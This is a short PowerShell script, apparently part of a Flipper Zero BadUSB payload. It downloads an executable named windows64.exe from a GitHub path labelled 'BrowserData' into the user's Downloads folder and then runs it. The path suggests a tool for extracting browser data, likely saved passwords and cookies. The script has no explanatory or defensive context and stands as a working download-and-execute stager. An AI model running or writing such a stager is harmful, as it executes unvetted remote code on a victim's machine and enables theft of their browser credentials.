Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe' -OutFile [System.IO.Path]::Combine($env:UserProfile, 'Downloads', 'windows64.exe')
Start-Process -FilePath [System.IO.Path]::Combine($env:UserProfile, 'Downloads', 'windows64.exe') -Wait
